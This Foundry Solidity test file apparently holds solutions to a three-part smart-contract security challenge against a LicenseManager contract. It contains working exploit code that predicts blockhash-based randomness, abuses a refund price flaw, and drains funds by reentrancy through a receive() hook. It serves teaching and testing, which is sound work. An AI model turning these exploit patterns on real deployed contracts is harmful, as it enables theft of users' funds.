// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/LicenseManager.sol";

/** 
 * @title Test contract for LicenseManager
 */
contract LicenseManagerTest is Test {

    LicenseManager license;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");

    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.prank(owner);
        license = new LicenseManager();

        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);

        vm.prank(user1);
        license.buyLicense{value: 1 ether}();

        vm.prank(user2);
        license.buyLicense{value: 1 ether}();

        vm.prank(user3);
        license.buyLicense{value: 1 ether}();

        vm.prank(user4);
        license.buyLicense{value: 1 ether}();

    }

    /** 
     * @dev exploit for bad randomness
     */
    function test_badrandomness() public {
        vm.deal(attacker, 0.01 ether);
        vm.startPrank(attacker);
        // challenge 1 solution - buy the licence exploiting the bad randomness for presence of blockhash
        console.log("Testing bad randomness with blockhash");
        console.log(attacker.balance);
        uint blockNumber = block.number;
        for(uint i=0; i<100; i++) {
            vm.roll(blockNumber);
            uint maxThreshold = uint(0.01 ether / 1e16);
            uint hashed = uint(keccak256(abi.encodePacked(uint256(0.01 ether), address(attacker), uint(1337),blockhash(block.number - 1)))) % 100;
            console.log("\tWe are on block ", blockNumber, " with hashed number ", hashed);
            if (hashed < maxThreshold) {
                console.log("\t\tFound! Sending 0.01 ether to obtain the license");
                license.winLicense{value: 0.01 ether}();
                break;
            }
            blockNumber++;
        }
        // end of challenge 1 solution
        assertEq(true, license.checkLicense());
        vm.stopPrank();

        vm.startPrank(attacker);
        // challenge 2 solution - refundLicense sends 1 ether even if you won the license for less
        console.log("Testing Business Logic in sold Price");
        console.log("\tInitial Balance:\t", 0.01 ether);
        console.log("\tAfter Win Balance:\t", attacker.balance);
        license.refundLicense();
        console.log("\tAfter Ref Balance:\t", attacker.balance);
        // end of challenge 2 solution
        assertGt(attacker.balance, 0.1 ether);
        vm.stopPrank();

    }

    // challenge 3 solution - reentrancy as the array it is not used for the check but the mapping, which is updated later, and used the call
    /** 
     * @dev exploit reentrancy in refund
     */
    function test_reentrancy() public {
        vm.deal(address(this), 1 ether);
        console.log("Testing Reentrancy");
        console.log("\tInitial Balance\t", address(this).balance);
        license.buyLicense{value: 1 ether}();
        console.log("\tAfter Buy\t", address(this).balance);
        license.refundLicense();
        console.log("\tFinal Balance\t", address(this).balance);
        assertGt(address(this).balance, 1 ether);
    }
    /**
     * @dev receive for reentrancy
    */
    receive() external payable {
        console.log("\t\tETH Arrived ", msg.value);
        //if (address(license).balance >= 1 ether) {
            console.log("\t\tReenter"); 
            license.refundLicense();
        //}
    }
    // end of challenge 3 solution

}
